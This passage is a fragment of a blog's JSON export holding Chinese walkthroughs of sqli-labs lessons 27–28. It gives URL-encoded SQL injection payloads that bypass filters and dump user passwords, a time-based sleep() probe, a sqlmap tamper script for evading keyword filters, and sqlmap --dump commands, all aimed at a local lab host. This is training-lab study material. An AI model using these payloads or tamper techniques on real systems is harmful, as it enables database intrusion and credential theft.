title=\"判断类型\"></a>判断类型</h3><p><code>http://192.168.75.132/sql/Less-27/?id=2&#39;and&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-27/002.png\" alt=\"002\"></p>\n<p>单引号闭合。</p>\n<h3 id=\"获取字段数\"><a href=\"#获取字段数\" class=\"headerlink\" title=\"获取字段数\"></a>获取字段数</h3><p><code>http://192.168.75.132/sql/Less-27/?id=2&#39;%09uNion%09seLect%091,2,3%09and&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-27/003.png\" alt=\"003\"></p>\n<h3 id=\"直接上结果\"><a href=\"#直接上结果\" class=\"headerlink\" title=\"直接上结果\"></a>直接上结果</h3><p><code>http://192.168.75.132/sql/Less-27/?id=1&#39;%09and%091=2%09uNion%09seLect%091,(seLect%09group_concat(id,&#39;~&#39;,username,&#39;~&#39;,password)%09from%09security.users%09),3%09and&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-27/004.png\" alt=\"004\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>这次跑的有点久,多了一个UnionSelect.py绕过union和select。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)</span></span><br><span class=\"line\"><span class=\"string\">See the file 'LICENSE' for copying permission</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> lib.core.enums <span class=\"keyword\">import</span> PRIORITY</span><br><span class=\"line\"></span><br><span class=\"line\">__priority__ = PRIORITY.NORMAL</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">tamper</span><span class=\"params\">(payload, **kwargs)</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">    Replaces union to ununionion,select to selseselectlectect</span></span><br><span class=\"line\"><span class=\"string\">    &gt;&gt;&gt; tamper('union select')</span></span><br><span class=\"line\"><span class=\"string\">    'ununionion selseselectlectect'</span></span><br><span class=\"line\"><span class=\"string\">    \"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">    retVal = payload</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> payload:</span><br><span class=\"line\">        retVal = re.sub(<span class=\"string\">r\"(?i)(union)\"</span>, <span class=\"string\">r\"ununionion\"</span>, re.sub(<span class=\"string\">r\"(?i)(select)\"</span>, <span class=\"string\">\"selseselectlectect\"</span>, payload))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> retVal</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight crystal\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UnionSelect.py：将<span class=\"class\"><span class=\"keyword\">union</span>替代<span class=\"title\">ununionion</span>,<span class=\"title\">select</span>替代<span class=\"title\">selseselectlectect</span></span></span><br><span class=\"line\">space0A.py\t：将空格替代为%<span class=\"number\">0</span>A</span><br><span class=\"line\">count.py\t：将count(*)替换成count(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-27/?id=1&quot; --technique E --dbms mysql --threads 10 --method GET --tamper &quot;UnionSelect.py,space0A.py,count.py&quot; --flush-session --fresh-queries -v 3</code></p>\n<p><img src=\"/img/sql/Lesson-27/005.png\" alt=\"005\"></p>\n<p><img src=\"/img/sql/Lesson-27/006.png\" alt=\"006\"></p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-27/?id=1&quot; --technique E --dbms mysql --threads 10 --method GET --tamper &quot;UnionSelect.py,space0A.py,count.py&quot; --dbs</code></p>\n<p><img src=\"/img/sql/Lesson-27/007.png\" alt=\"007\"></p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-27/?id=1&quot; --technique E --dbms mysql --threads 10 --method GET --tamper &quot;UnionSelect.py,space0A.py,count.py&quot; -D security --tables</code></p>\n<p><img src=\"/img/sql/Lesson-27/008.png\" alt=\"008\"></p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-27/?id=1&quot; --technique E --dbms mysql --threads 10 --method GET --tamper &quot;UnionSelect.py,space0A.py,count.py&quot; -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-27/009.png\" alt=\"009\"></p>\n"},{"title":"sqli-labs lession-27a GET基于错误-你的UNION和SELECT归我所有-双引号","date":"2018-10-06T14:19:23.000Z","_content":"\n# sqli-labs lession-27a GET基于错误-你的UNION和SELECT归我所有-双引号\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-27a/001.png)\n\n## 注入\n\n### 判断类型\n\n由于没有报错信息只能通过时间函数来判断了。\n\n`http://192.168.75.132/sql/Less-27a/?id=1%0Aand%0A1=2`\n\n![002](/img/sql/Lesson-27a/002.png)\n\n如果SQL语句是这样的话`\t$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";`会把传进去的`1 and 1=2`进行判断,左右两边都成立才会显示查询到的数据。明明右边不成力,这里直接却显示出了数据,肯定不是数字型。\n\n字符型很好判断,因为id在数据库被设置为int类型,而在php中遇到字符串转换int类型时默认会把字符串的第一个字符转为数字,这里`1 and 1=2`的第一个是`1`,那么就转换成了1。对应的如果传进去的`a and 1=2`会拿`a`转数字,然而字母转数字默认为0,如果数据库中没有id=0的数据,就不会显示了。\n\n![003](/img/sql/Lesson-27a/003.png)\n\n用if()函数和sleep()函数判断。\n\n`http://192.168.75.132/sql/Less-27a/?id=1\"%0Aand%0Aif(1,sleep(60),null)%0Aand%0A\"1`\n\n![004](/img/sql/Lesson-27a/004.png)\n\n可以判断这一课是使用双引号闭合的了。\n\n### 过程\n\n其他的和Lesson-26只是闭合方式不同,其他一样,直接上图。\n\n`http://192.168.75.132/sql/Less-27a/?id=1\"%0Aand%0A1=2%0AuNion%0AseLect%0A1,(seLect%0Agroup_concat(id,'~',username,'~',password)%0Afrom%0Asecurity.users%0A),3%0Aand\"1`\n\n![005](/img/sql/Lesson-27a/005.png)\n\n{% post_link sqli-labs-lession-27-GET基于错误-你的UNION和SELECT归我所有-字符型单引号 点击查看Lesson-27 %}\n\n## SQLMAP\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-27a/?id=1\" --technique B --dbms mysql --threads 10 --method GET --tamper \"UnionSelect.py,space0A.py,count.py\" --flush-session --fresh-queries -v 3 --level 2`\n\n```\n--technique B:检查布尔型注入方式\n--threads 10：并发线程数为10\n--method GET：使用GET方法\n--tamper \"UnionSelect.py,space0A.py,count.py\"：绕过Union,Select，空格，count(*)\n--flush-session:刷新session\n--fresh-queries:发起新查询\n-v 3：显示测试过程\n--level 2：等级2才会检查双引号\n```\n\n![006](/img/sql/Lesson-27a/006.png)\n\n![007](/img/sql/Lesson-27a/007.png)\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-27a/?id=1\" --technique B --dbms mysql --threads 10 --method GET --tamper \"UnionSelect.py,space0A.py,count.py\" --dbs`\n\n![008](/img/sql/Lesson-27a/008.png)\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-27a/?id=1\" --technique B --dbms mysql --threads 10 --method GET --tamper \"UnionSelect.py,space0A.py,count.py\" -D security -T users --columns --dump`\n\n![009](/img/sql/Lesson-27a/009.png)","source":"_posts/sqli-labs-lession-27a-GET基于错误-你的UNION和SELECT归我所有-双引号.md","raw":"---\ntitle: sqli-labs lession-27a GET基于错误-你的UNION和SELECT归我所有-双引号\ndate: 2018-10-06 22:19:23\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-27a GET基于错误-你的UNION和SELECT归我所有-双引号\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-27a/001.png)\n\n## 注入\n\n### 判断类型\n\n由于没有报错信息只能通过时间函数来判断了。\n\n`http://192.168.75.132/sql/Less-27a/?id=1%0Aand%0A1=2`\n\n![002](/img/sql/Lesson-27a/002.png)\n\n如果SQL语句是这样的话`\t$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";`会把传进去的`1 and 1=2`进行判断,左右两边都成立才会显示查询到的数据。明明右边不成力,这里直接却显示出了数据,肯定不是数字型。\n\n字符型很好判断,因为id在数据库被设置为int类型,而在php中遇到字符串转换int类型时默认会把字符串的第一个字符转为数字,这里`1 and 1=2`的第一个是`1`,那么就转换成了1。对应的如果传进去的`a and 1=2`会拿`a`转数字,然而字母转数字默认为0,如果数据库中没有id=0的数据,就不会显示了。\n\n![003](/img/sql/Lesson-27a/003.png)\n\n用if()函数和sleep()函数判断。\n\n`http://192.168.75.132/sql/Less-27a/?id=1\"%0Aand%0Aif(1,sleep(60),null)%0Aand%0A\"1`\n\n![004](/img/sql/Lesson-27a/004.png)\n\n可以判断这一课是使用双引号闭合的了。\n\n### 过程\n\n其他的和Lesson-26只是闭合方式不同,其他一样,直接上图。\n\n`http://192.168.75.132/sql/Less-27a/?id=1\"%0Aand%0A1=2%0AuNion%0AseLect%0A1,(seLect%0Agroup_concat(id,'~',username,'~',password)%0Afrom%0Asecurity.users%0A),3%0Aand\"1`\n\n![005](/img/sql/Lesson-27a/005.png)\n\n{% post_link sqli-labs-lession-27-GET基于错误-你的UNION和SELECT归我所有-字符型单引号 点击查看Lesson-27 %}\n\n## SQLMAP\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-27a/?id=1\" --technique B --dbms mysql --threads 10 --method GET --tamper \"UnionSelect.py,space0A.py,count.py\" --flush-session --fresh-queries -v 3 --level 2`\n\n```\n--technique B:检查布尔型注入方式\n--threads 10：并发线程数为10\n--method GET：使用GET方法\n--tamper \"UnionSelect.py,space0A.py,count.py\"：绕过Union,Select，空格，count(*)\n--flush-session:刷新session\n--fresh-queries:发起新查询\n-v 3：显示测试过程\n--level 2：等级2才会检查双引号\n```\n\n![006](/img/sql/Lesson-27a/006.png)\n\n![007](/img/sql/Lesson-27a/007.png)\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-27a/?id=1\" --technique B --dbms mysql --threads 10 --method GET --tamper \"UnionSelect.py,space0A.py,count.py\" --dbs`\n\n![008](/img/sql/Lesson-27a/008.png)\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-27a/?id=1\" --technique B --dbms mysql --threads 10 --method GET --tamper \"UnionSelect.py,space0A.py,count.py\" -D security -T users --columns --dump`\n\n![009](/img/sql/Lesson-27a/009.png)","slug":"sqli-labs-lession-27a-GET基于错误-你的UNION和SELECT归我所有-双引号","published":1,"updated":"2019-06-19T17:23:13.389Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istdj003i4dsbzswcsmy3","content":"<h1 id=\"sqli-labs-lession-27a-GET基于错误-你的UNION和SELECT归我所有-双引号\"><a href=\"#sqli-labs-lession-27a-GET基于错误-你的UNION和SELECT归我所有-双引号\" class=\"headerlink\" title=\"sqli-labs lession-27a GET基于错误-你的UNION和SELECT归我所有-双引号\"></a>sqli-labs lession-27a GET基于错误-你的UNION和SELECT归我所有-双引号</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-27a/001.png\" alt=\"001\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><h3 id=\"判断类型\"><a href=\"#判断类型\" class=\"headerlink\" title=\"判断类型\"></a>判断类型</h3><p>由于没有报错信息只能通过时间函数来判断了。</p>\n<p><code>http://192.168.75.132/sql/Less-27a/?id=1%0Aand%0A1=2</code></p>\n<p><img src=\"/img/sql/Lesson-27a/002.png\" alt=\"002\"></p>\n<p>如果SQL语句是这样的话<code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code>会把传进去的<code>1 and 1=2</code>进行判断,左右两边都成立才会显示查询到的数据。明明右边不成力,这里直接却显示出了数据,肯定不是数字型。</p>\n<p>字符型很好判断,因为id在数据库被设置为int类型,而在php中遇到字符串转换int类型时默认会把字符串的第一个字符转为数字,这里<code>1 and 1=2</code>的第一个是<code>1</code>,那么就转换成了1。对应的如果传进去的<code>a and 1=2</code>会拿<code>a</code>转数字,然而字母转数字默认为0,如果数据库中没有id=0的数据,就不会显示了。</p>\n<p><img src=\"/img/sql/Lesson-27a/003.png\" alt=\"003\"></p>\n<p>用if()函数和sleep()函数判断。</p>\n<p><code>http://192.168.75.132/sql/Less-27a/?id=1&quot;%0Aand%0Aif(1,sleep(60),null)%0Aand%0A&quot;1</code></p>\n<p><img src=\"/img/sql/Lesson-27a/004.png\" alt=\"004\"></p>\n<p>可以判断这一课是使用双引号闭合的了。</p>\n<h3 id=\"过程\"><a href=\"#过程\" class=\"headerlink\" title=\"过程\"></a>过程</h3><p>其他的和Lesson-26只是闭合方式不同,其他一样,直接上图。</p>\n<p><code>http://192.168.75.132/sql/Less-27a/?id=1&quot;%0Aand%0A1=2%0AuNion%0AseLect%0A1,(seLect%0Agroup_concat(id,&#39;~&#39;,username,&#39;~&#39;,password)%0Afrom%0Asecurity.users%0A),3%0Aand&quot;1</code></p>\n<p><img src=\"/img/sql/Lesson-27a/005.png\" alt=\"005\"></p>\n<a href=\"/2018/10/06/sqli-labs-lession-27-GET基于错误-你的UNION和SELECT归我所有-字符型单引号/\" title=\"点击查看Lesson-27\">点击查看Lesson-27</a>\n\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-27a/?id=1&quot; --technique B --dbms mysql --threads 10 --method GET --tamper &quot;UnionSelect.py,space0A.py,count.py&quot; --flush-session --fresh-queries -v 3 --level 2</code></p>\n<figure class=\"highlight oxygene\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--technique B:检查布尔型注入方式</span><br><span class=\"line\">--threads <span class=\"number\">10</span>：并发线程数为<span class=\"number\">10</span></span><br><span class=\"line\">--<span class=\"function\"><span class=\"keyword\">method</span> <span class=\"title\">GET</span>：使用<span class=\"title\">GET</span>方法</span></span><br><span class=\"line\"><span class=\"function\">--<span class=\"title\">tamper</span> \"<span class=\"title\">UnionSelect</span>.<span class=\"title\">py</span>,<span class=\"title\">space0A</span>.<span class=\"title\">py</span>,<span class=\"title\">count</span>.<span class=\"title\">py</span>\"：绕过<span class=\"title\">Union</span>,<span class=\"title\">Select</span>，空格，<span class=\"title\">count</span><span class=\"params\">(*)</span></span></span><br><span class=\"line\"><span class=\"function\">--<span class=\"title\">flush</span>-<span class=\"title\">session</span>:</span>刷新session</span><br><span class=\"line\">--fresh-queries:发起新查询</span><br><span class=\"line\">-v <span class=\"number\">3</span>：显示测试过程</span><br><span class=\"line\">--level <span class=\"number\">2</span>：等级<span class=\"number\">2</span>才会检查双引号</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/sql/Lesson-27a/006.png\" alt=\"006\"></p>\n<p><img src=\"/img/sql/Lesson-27a/007.png\" alt=\"007\"></p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-27a/?id=1&quot; --technique B --dbms mysql --threads 10 --method GET --tamper &quot;UnionSelect.py,space0A.py,count.py&quot; --dbs</code></p>\n<p><img src=\"/img/sql/Lesson-27a/008.png\" alt=\"008\"></p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-27a/?id=1&quot; --technique B --dbms mysql --threads 10 --method GET --tamper &quot;UnionSelect.py,space0A.py,count.py&quot; -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-27a/009.png\" alt=\"009\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-27a-GET基于错误-你的UNION和SELECT归我所有-双引号\"><a href=\"#sqli-labs-lession-27a-GET基于错误-你的UNION和SELECT归我所有-双引号\" class=\"headerlink\" title=\"sqli-labs lession-27a GET基于错误-你的UNION和SELECT归我所有-双引号\"></a>sqli-labs lession-27a GET基于错误-你的UNION和SELECT归我所有-双引号</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-27a/001.png\" alt=\"001\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><h3 id=\"判断类型\"><a href=\"#判断类型\" class=\"headerlink\" title=\"判断类型\"></a>判断类型</h3><p>由于没有报错信息只能通过时间函数来判断了。</p>\n<p><code>http://192.168.75.132/sql/Less-27a/?id=1%0Aand%0A1=2</code></p>\n<p><img src=\"/img/sql/Lesson-27a/002.png\" alt=\"002\"></p>\n<p>如果SQL语句是这样的话<code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code>会把传进去的<code>1 and 1=2</code>进行判断,左右两边都成立才会显示查询到的数据。明明右边不成力,这里直接却显示出了数据,肯定不是数字型。</p>\n<p>字符型很好判断,因为id在数据库被设置为int类型,而在php中遇到字符串转换int类型时默认会把字符串的第一个字符转为数字,这里<code>1 and 1=2</code>的第一个是<code>1</code>,那么就转换成了1。对应的如果传进去的<code>a and 1=2</code>会拿<code>a</code>转数字,然而字母转数字默认为0,如果数据库中没有id=0的数据,就不会显示了。</p>\n<p><img src=\"/img/sql/Lesson-27a/003.png\" alt=\"003\"></p>\n<p>用if()函数和sleep()函数判断。</p>\n<p><code>http://192.168.75.132/sql/Less-27a/?id=1&quot;%0Aand%0Aif(1,sleep(60),null)%0Aand%0A&quot;1</code></p>\n<p><img src=\"/img/sql/Lesson-27a/004.png\" alt=\"004\"></p>\n<p>可以判断这一课是使用双引号闭合的了。</p>\n<h3 id=\"过程\"><a href=\"#过程\" class=\"headerlink\" title=\"过程\"></a>过程</h3><p>其他的和Lesson-26只是闭合方式不同,其他一样,直接上图。</p>\n<p><code>http://192.168.75.132/sql/Less-27a/?id=1&quot;%0Aand%0A1=2%0AuNion%0AseLect%0A1,(seLect%0Agroup_concat(id,&#39;~&#39;,username,&#39;~&#39;,password)%0Afrom%0Asecurity.users%0A),3%0Aand&quot;1</code></p>\n<p><img src=\"/img/sql/Lesson-27a/005.png\" alt=\"005\"></p>\n<a href=\"/2018/10/06/sqli-labs-lession-27-GET基于错误-你的UNION和SELECT归我所有-字符型单引号/\" title=\"点击查看Lesson-27\">点击查看Lesson-27</a>\n\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-27a/?id=1&quot; --technique B --dbms mysql --threads 10 --method GET --tamper &quot;UnionSelect.py,space0A.py,count.py&quot; --flush-session --fresh-queries -v 3 --level 2</code></p>\n<figure class=\"highlight oxygene\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--technique B:检查布尔型注入方式</span><br><span class=\"line\">--threads <span class=\"number\">10</span>：并发线程数为<span class=\"number\">10</span></span><br><span class=\"line\">--<span class=\"function\"><span class=\"keyword\">method</span> <span class=\"title\">GET</span>：使用<span class=\"title\">GET</span>方法</span></span><br><span class=\"line\"><span class=\"function\">--<span class=\"title\">tamper</span> \"<span class=\"title\">UnionSelect</span>.<span class=\"title\">py</span>,<span class=\"title\">space0A</span>.<span class=\"title\">py</span>,<span class=\"title\">count</span>.<span class=\"title\">py</span>\"：绕过<span class=\"title\">Union</span>,<span class=\"title\">Select</span>，空格，<span class=\"title\">count</span><span class=\"params\">(*)</span></span></span><br><span class=\"line\"><span class=\"function\">--<span class=\"title\">flush</span>-<span class=\"title\">session</span>:</span>刷新session</span><br><span class=\"line\">--fresh-queries:发起新查询</span><br><span class=\"line\">-v <span class=\"number\">3</span>：显示测试过程</span><br><span class=\"line\">--level <span class=\"number\">2</span>：等级<span class=\"number\">2</span>才会检查双引号</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/sql/Lesson-27a/006.png\" alt=\"006\"></p>\n<p><img src=\"/img/sql/Lesson-27a/007.png\" alt=\"007\"></p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-27a/?id=1&quot; --technique B --dbms mysql --threads 10 --method GET --tamper &quot;UnionSelect.py,space0A.py,count.py&quot; --dbs</code></p>\n<p><img src=\"/img/sql/Lesson-27a/008.png\" alt=\"008\"></p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-27a/?id=1&quot; --technique B --dbms mysql --threads 10 --method GET --tamper &quot;UnionSelect.py,space0A.py,count.py&quot; -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-27a/009.png\" alt=\"009\"></p>\n"},{"title":"sqli-labs lession-28 GET基于错误-你的UNION和SELECT归我所有-字符型单引号和括号","date":"2018-10-07T12:03:26.000Z","_content":"\n# sqli-labs lession-28 GET基于错误-你的UNION和SELECT归我所有-字符型单引号和括号\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-28/001.png)\n\n## 分析\n\n这标题有毒吧,不是基于错误吗,结果源码里把报错注释了,结果我做成布尔盲注了。\n\n```\nfunction blacklist($id)\n{\n$id= preg_replace('/[\\/\\*]/',\"\", $id);\t\t//过滤 / *.\n$id= preg_replace('/[--]/',\"\", $id);\t\t//过滤 -.\n$id= preg_replace('/[#]/',\"\", $id);\t\t\t//过滤 #.\n$id= preg_replace('/[ +]/',\"\", $id);\t\t//过滤 空格 +.\n//$id= preg_replace('/select/m',\"\", $id);\t\n$id= preg_replace('/[ +]/',\"\", $id);\t    //过滤 空格 +.\n$id= preg_replace('/union\\s+select/i',\"\", $id);\t //过滤无论大小写的（UNION 空格符 SELECT）.单独的不会过虑。\nreturn $id;\n}\n```\n绕过空格都是前几课做的,这里就将绕过过滤（UNION 空格符 SELECT）\n\n1. 用`union all select`替代`union 空格符 select`\n\n`http://192.168.75.132/sql/Less-28/?id=4')%0AuNion%0Aall%0AseLect%0A1,2,3%0Aand('1`\n\n![002](/img/sql/Lesson-28/002.png)\n\n2. 用`%A0`替代空格\n\n`%A0`有时候会被解析成特殊字符,php-5.2.17版本可行\n\n`http://192.168.75.132/sql/Less-28/?id=4')%0AuNion%A0seLect%0A1,2,3%0Aand('1`\n\n![003](/img/sql/Lesson-28/003.png)\n\n3. 双写绕过用`unionuNion%0AseLect%0Aselect`替代`union select`\n\n`http://192.168.75.132/sql/Less-28/?id=2')%0AunionuNion%0AseLect%0Aselect%0A1,2,3%0Aand('1`\n\n![004](/img/sql/Lesson-28/004.png)\n\n4. 在union和select中间添加谓词  （distinct,distinctrow）\n\n`http://192.168.75.132/sql/Less-28/?id=3')%0AuNion%0Adistinct%0AseLect%0A1,2,3%0Aand('1`\n\n![005](/img/sql/Lesson-28/005.png)\n\n## 手注\n\n直接结果\n\n`http://192.168.75.132/sql/Less-28/?id=2'and%0A1=2)%0Aunion%0Aall%0AseLect%0A1,(select(group_concat(table_name))from(information_schema.tables)where(table_schema='security')),3%0A%0Aand('1`\n\n![006](/img/sql/Lesson-28/006.png)\n\n`http://192.168.75.132/sql/Less-28/?id=2'and%0A1=2)%0Aunion%0Aall%0AseLect%0A1,(select(group_concat(id,'~',username,'~',password))from(security.users)),3%0A%0Aand('1`\n\n![007](/img/sql/Lesson-28/007.png)\n\n## SQLMAP\n\n写了的`union select`绕过脚本没用上。\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-28/?id=1\" --method GET --technique B --dbms mysql --threads 10 --level 2 --flush-session --fresh-queries --tamper \"space0A.py\" -v 3`\n\n![008](/img/sql/Lesson-28/008.png)\n\n![009](/img/sql/Lesson-28/009.png)\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-28/?id=1\" --method GET --technique B --dbms mysql --threads 10 --level 2  --tamper \"space0A.py\" --dbs`\n\n![010](/img/sql/Lesson-28/010.png)\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-28/?id=1\" --method GET --technique B --dbms mysql --threads 10  --tamper \"space0A.py\" -v 3 -D security --tables`\n\n![011](/img/sql/Lesson-28/011.png)\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-28/?id=1\" --method GET --technique B --dbms mysql --threads 10  --tamper \"space0A.py,count.py\" -D security -T users --columns --dump`\n\n![012](/img/sql/Lesson-28/012.png)\n\n\n\n\n","source":"_posts/sqli-labs-lession-28-GET基于错误-你的UNION和SELECT归我所有-字符型单引号和括号.md","raw":"---\ntitle: sqli-labs lession-28 GET基于错误-你的UNION和SELECT归我所有-字符型单引号和括号\ndate: 2018-10-07 20:03:26\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-28 GET基于错误-你的UNION和SELECT归我所有-字符型单引号和括号\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-28/001.png)\n\n## 分析\n\n这标题有毒吧,不是基于错误吗,结果源码里把报错注释了,结果我做成布尔盲注了。\n\n```\nfunction blacklist($id)\n{\n$id= preg_replace('/[\\/\\*]/',\"\", $id);\t\t//过滤 / *.\n$id= preg_replace('/[--]/',\"\", $id);\t\t//过滤 -.\n$id= preg_replace('/[#]/',\"\", $id);\t\t\t//过滤 #.\n$id= preg_replace('/[ +]/',\"\", $id);\t\t//过滤 空格 +.\n//$id= preg_replace('/select/m',\"\", $id);\t\n$id= preg_replace('/[ +]/',\"\", $id);\t    //过滤 空格 +.\n$id= preg_replace('/union\\s+select/i',\"\", $id);\t //过滤无论大小写的（UNION 空格符 SELECT）.单独的不会过虑。\nreturn $id;\n}\n```\n绕过空格都是前几课做的,这里就将绕过过滤（UNION 空格符 SELECT）\n\n1. 用`union all select`替代`union 空格符 select`\n\n`http://192.168.75.132/sql/Less-28/?id=4')%0AuNion%0Aall%0AseLect%0A1,2,3%0Aand('1`\n\n![002](/img/sql/Lesson-28/002.png)\n\n2. 用`%A0`替代空格\n\n`%A0`有时候会被解析成特殊字符,php-5.2.17版本可行\n\n`http://192.168.75.132/sql/Less-28/?id=4')%0AuNion%A0seLect%0A1,2,3%0Aand('1`\n\n![003](/img/sql/Lesson-28/003.png)\n\n3. 双写绕过用`unionuNion%0AseLect%0Aselect`替代`union select`\n\n`http://192.168.75.132/sql/Less-28/?id=2')%0AunionuNion%0AseLect%0Aselect%0A1,2,3%0Aand('1`\n\n![004](/img/sql/Lesson-28/004.png)\n\n4. 在union和select中间添加谓词  （distinct,distinctrow）\n\n`http://192.168.75.132/sql/Less-28/?id=3')%0AuNion%0Adistinct%0AseLect%0A1,2,3%0Aand('1`\n\n![005](/img/sql/Lesson-28/005.png)\n\n## 手注\n\n直接结果\n\n`http://192.168.75.132/sql/Less-28/?id=2'and%0A1=2)%0Aunion%0Aall%0AseLect%0A1,(select(group_concat(table_name))from(information_schema.tables)where(table_schema='security')),3%0A%0Aand('1`\n\n![006](/img/sql/Lesson-28/006.png)\n\n`http://192.168.75.132/sql/Less-28/?id=2'and%0A1=2)%0Aunion%0Aall%0AseLect%0A1,(select(group_concat(id,'~',username,'~',password))from(security.users)),3%0A%0Aand('1`\n\n![007](/img/sql/Lesson-28/007.png)\n\n## SQLMAP\n\n写了的`union select`绕过脚本没用上。\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-28/?id=1\" --method GET --technique B --dbms mysql --threads 10 --level 2 --flush-session --fresh-queries --tamper \"space0A.py\" -v 3`\n\n![008](/img/sql/Lesson-28/008.png)\n\n![009](/img/sql/Lesson-28/009.png)\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-28/?id=1\" --method GET --technique B --dbms mysql --threads 10 --level 2  --tamper \"space0A.py\" --dbs`\n\n![010](/img/sql/Lesson-28/010.png)\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-28/?id=1\" --method GET --technique B --dbms mysql --threads 10  --tamper \"space0A.py\" -v 3 -D security 